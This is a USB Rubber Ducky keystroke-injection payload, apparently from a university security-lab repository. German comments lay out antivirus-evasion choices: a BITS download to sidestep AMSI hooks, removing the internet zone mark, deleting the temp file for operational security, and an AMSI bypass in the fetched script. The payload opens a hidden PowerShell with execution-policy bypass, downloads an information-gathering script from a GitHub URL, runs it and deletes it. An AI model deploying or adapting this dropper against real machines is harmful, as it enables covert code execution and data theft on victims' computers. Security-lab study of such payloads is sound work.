REM  AV-Evasion / Reliability:
REM    - %ComSpec% = voller Pfad zu cmd.exe (immer gefunden)
REM    - BITS (Background Intelligent Transfer Service) statt
REM      WebClient + IEX/scriptblock (AMSI-Hook umgehen)
REM    - BITS nutzt Windows-eigenen Download-Dienst (Windows Update),
REM      selten von AV geflaggt
REM    - Kein IEX, kein scriptblock, kein WebClient im Run-Befehl
REM    - Unblock-File entfernt Zone.Identifier ADS (Internet-Markierung)
REM    - Temp-Datei wird nach Ausfuehrung geloescht (OPSEC)
REM    - AMSI-Bypass + String-Obfuskierung im PS1-Script selbst

DELAY 2000
GUI r
DELAY 1000
STRINGLN powershell -nop -ep bypass -w h -c "ipmo BitsTransfer;Start-BitsTransfer 'https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1' ~\r.ps1;.~\r.ps1;ri ~\r.ps1 -f -ea 0"
